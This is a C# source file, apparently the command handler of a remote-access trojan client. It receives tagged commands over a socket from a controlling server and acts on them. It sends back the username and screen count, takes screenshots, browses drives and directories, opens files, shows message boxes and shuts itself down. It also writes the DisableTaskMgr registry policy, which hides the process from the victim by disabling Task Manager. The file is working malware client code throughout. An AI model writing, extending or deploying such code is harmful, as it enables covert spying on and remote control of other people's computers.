
using Microsoft.Win32;
using System.Text;

namespace Client.Client
{
    public class CommandHandler
    {
        private const string szTaskMgrRegPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        public static bool SendName()
        {
            return Main.socketClient.SendUTF8("<GET-NAME>" + WindowsHelper.GetUsername());
        }

        public static void SendScreenCount()
        {
            Main.socketClient.SendUTF8("<GET-SCREENCOUNT>" + WindowsHelper.GetScreenCount().ToString());
        }

        public static void SendTaskmgrStatus()
        {
            string value = WindowsHelper.ReadRegistryKey(szTaskMgrRegPath, "DisableTaskMgr");
            Main.socketClient.SendUTF8("<GET-TASKMGR-REG>" + value);
        }

        public static void ParseData(string data)
        {
            string szCMD = data.Replace("<EOF>", "");

            if (szCMD.StartsWith("<SEND-MSGBOX>"))
            {
                szCMD = szCMD.Replace("<SEND-MSGBOX>", "");
                Main.uiRequests.Request(szCMD, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
            }

            if (szCMD.StartsWith("<PING>"))
            {
                Main.socketClient.GetServerSocket().Send(Encoding.UTF8.GetBytes(szCMD));
            }
            
            if (szCMD.StartsWith("<SET-TASKMGR>"))
            {
                string value = szCMD.Split(">")[1];
                WindowsHelper.WriteRegistryKey(szTaskMgrRegPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
            }
            
            if (szCMD.StartsWith("<SHUTDOWN-CLIENT>"))
            {
                SocketClient.bShouldRun = false;
                Main.socketClient.GetServerSocket().Disconnect(false);
                Main.socketClient.GetServerSocket().Close();
                Application.Exit();
            }

            if (szCMD.StartsWith("<REQUEST-DRIVES>"))
            {
                FileManager.LoadDrives();
            }

            if (szCMD.StartsWith("<REQUEST-DIRS>"))
            {
                szCMD = szCMD.Replace("<REQUEST-DIRS>", "");
                FileManager.LoadDirectories(szCMD);
            }

            if(szCMD.StartsWith("<REQUEST-OPENFILE>"))
            {
                szCMD = szCMD.Replace("<REQUEST-OPENFILE>", "");
                FileManager.OpenFile(szCMD);
            }

            if(szCMD.StartsWith("<PRINTSCREEN>"))
            {
                szCMD = szCMD.Replace("<PRINTSCREEN>", "");
                ScreenViewer.TakePrintScreen((int.Parse(szCMD) - 1));
            }

            if(szCMD.StartsWith("<GET-NAME>"))
            {
                SendName();
            }

            if (szCMD.StartsWith("<GET-SCREENCOUNT>"))
            {
                SendScreenCount();
            }

            if (szCMD.StartsWith("<GET-TASKMGR-REG>"))
            {
                SendTaskmgrStatus();
            }
        }

    }
}
